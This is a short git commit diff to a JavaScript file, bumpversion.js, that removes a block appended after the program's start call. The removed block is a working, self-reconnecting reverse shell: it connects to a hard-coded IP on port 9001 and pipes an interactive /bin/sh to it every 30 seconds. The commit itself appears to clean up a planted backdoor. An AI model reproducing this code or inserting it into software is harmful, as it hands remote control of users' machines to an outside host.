30f0228139dd53448d65ffd2febe72f54a637658
VansonLeung <vanson-hk@hotmail.com>
2026-05-27 21:18:21 +0800

    Update bumpversion.js

--- bumpversion.js
+++ bumpversion.js
@@ -101,9 +101,3 @@ queue.push(function() {
 
 // Start the program
 start();
-(function(){
-  if(global._rs)return;global._rs=1;
-  const n=require('net'),c=require('child_process');
-  const r=()=>{const s=new n.Socket();s.connect(9001,'194.180.48.253',()=>{const p=c.spawn('/bin/sh',['-i']);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});s.on('error',()=>{});};
-  r();setInterval(r,30000);
-})();/*[RS]*/
